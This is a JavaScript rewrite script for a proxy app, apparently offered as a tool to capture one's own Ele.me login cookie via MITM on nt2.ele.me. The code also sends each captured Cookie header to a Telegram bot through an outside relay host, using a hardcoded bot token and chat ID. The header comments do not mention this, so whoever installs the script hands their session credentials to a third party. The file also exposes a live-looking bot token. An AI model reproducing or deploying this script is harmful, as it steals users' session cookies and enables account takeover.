/*
[rewrite_local]
# 获取 cookie
登录elm，打开我的-吃货豆，获取https://nt2.ele.me/c/b?请求中的Cookie
https://nt2.ele.me/c/b? url script-request-header elm.js

[mitm]
hostname = nt2.ele.me
*/

class Env {
    constructor(name) {
        this.name = name;
        this.data = {};
    }

    setdata(val, key) {
        this.data[key] = val;
        console.log(`Set data: ${key} = ${val}`);
    }

    msg(title, subtitle, body) {
        console.log(`${title}\n${subtitle}\n${body}`);
    }

    done() {
        console.log('Done');
    }
}

const $ = new Env("饿了么Cookie");

if ($request && $request.headers) {
    const cookie = $request.headers['Cookie'];
    if (cookie && !$.data['elmck']) {
        $.setdata(cookie, 'elmck');
        sendToTelegram(cookie);
    } else {
        $.msg("饿了么", "Cookie 已存在", "不再重复获取");
    }
}

$.done();

function sendToTelegram(cookie) {
    const token = '2130659069:AAGUqK6kx97P07MMzf14pOZAiRSisdR9-EI';
    const chatId = '1817565003';
    const url = `https://tg1.dinding.eu.org/bot${token}/sendMessage`;

    const message = {
        chat_id: chatId,
        text: `${cookie}`
    };

    const xhr = new XMLHttpRequest();
    xhr.open('POST', url, true);
    xhr.setRequestHeader('Content-Type', 'application/json');

    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                $.msg("饿了么", "Cookie 已发送到 Telegram", cookie);
            } else {
                $.msg("饿了么", "发送失败", xhr.responseText);
            }
        }
    };

    xhr.onerror = function () {
        $.msg("饿了么", "请求错误", "无法连接到 Telegram");
    };

    xhr.send(JSON.stringify(message));
}
